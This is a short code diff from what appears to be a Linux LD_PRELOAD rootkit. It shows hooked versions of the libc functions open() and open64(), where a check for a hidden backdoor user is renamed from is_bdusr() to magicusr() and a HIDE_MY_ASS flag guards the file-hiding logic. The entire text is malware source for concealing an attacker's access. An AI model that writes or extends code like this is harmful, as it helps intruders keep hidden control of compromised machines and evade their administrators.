@@ -1,6 +1,6 @@
 int open(const char *pathname, int flags, mode_t mode){
     hook(COPEN);
-    if(is_bdusr()){
+    if(magicusr()){
 #ifdef HIDE_MY_ASS
         int ret = (long)call(COPEN, pathname, flags, mode);
         if(ret){
@@ -78,7 +78,7 @@ int open(const char *pathname, int flags, mode_t mode){
 
 int open64(const char *pathname, int flags, mode_t mode){
     hook(COPEN64);
-    if(is_bdusr()){
+    if(magicusr()){
 #ifdef HIDE_MY_ASS
         int ret = (long)call(COPEN64, pathname, flags, mode);
         if(ret){
